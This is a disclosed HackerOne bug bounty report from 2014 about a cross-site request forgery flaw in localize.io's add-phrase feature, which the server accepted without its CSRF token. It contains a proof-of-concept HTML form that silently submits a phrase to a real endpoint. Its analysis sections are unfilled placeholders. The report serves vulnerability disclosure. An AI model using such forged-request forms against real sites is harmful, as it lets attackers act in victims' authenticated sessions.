---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '7962'
original_report_id: '7962'
title: CSRF in adding phrase.
weakness: Cross-Site Request Forgery (CSRF)
team_handle: localize
created_at: '2014-04-18T05:50:22.849Z'
disclosed_at: '2014-04-19T02:07:56.986Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 11
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# CSRF in adding phrase.

## Metadata

- HackerOne Report ID: 7962
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: localize
- Disclosed At: 2014-04-19T02:07:56.986Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

CSRF is an attack which forces an end user to execute unwanted actions on a web application in which he/she is currently authenticated. With a little help of social engineering (like sending a link via email/chat), an attacker may trick the users of a web application into executing actions of the attacker's choosing.

CSRF HTML Code:
<html>
  <body>
    <form action="http://www.localize.io/add_phrase/59/languages/3" method="POST">
      <input type="hidden" name="add&#95;phrase&#91;type&#93;" value="1" />
      <input type="hidden" name="add&#95;phrase&#91;key&#93;" value="asdasd" />
      <input type="hidden" name="add&#95;phrase&#91;string&#93;" value="456" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

in fact there is a CSRF Token in the form, but i remove that, and i try to submit the request,
and it works perfectly.
name="CSRFToken"

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
